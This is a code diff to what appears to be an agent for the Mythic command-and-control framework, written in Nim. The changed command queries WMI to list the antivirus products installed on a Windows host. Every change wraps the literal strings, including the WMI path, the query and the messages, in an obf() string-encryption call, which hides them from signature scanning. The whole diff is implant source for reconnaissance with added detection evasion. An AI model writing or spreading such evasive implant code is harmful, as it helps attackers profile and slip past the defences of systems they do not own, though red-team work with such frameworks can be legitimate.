@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat]
 when defined(windows):
   import winim/com
@@ -12,19 +13,19 @@ proc getAv*(taskId: string, params: JsonNode): JsonNode =
       debug "[DEBUG] Querying WMI for antivirus products"
       
       var avList: string = ""
-      let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
+      let wmisec = GetObject(obf(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2"))
       
-      for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct"):
+      for avprod in wmisec.execQuery(obf("SELECT displayName FROM AntiVirusProduct")):
         avList.add($avprod.displayName & "\n")
       
       avList = avList.strip(trailing = true)
       
       if avList.len == 0:
-        avList = "No antivirus products detected"
+        avList = obf("No antivirus products detected")
       
       return mythicSuccess(taskId, avList)
       
     except Exception as e:
-      return mythicError(taskId, &"Failed to query antivirus products: {e.msg}")
+      return mythicError(taskId, obf("Failed to query antivirus products: ") & e.msg)
   else:
-    return mythicError(taskId, "get_av command is only available on Windows")
+    return mythicError(taskId, obf("get_av command is only available on Windows"))
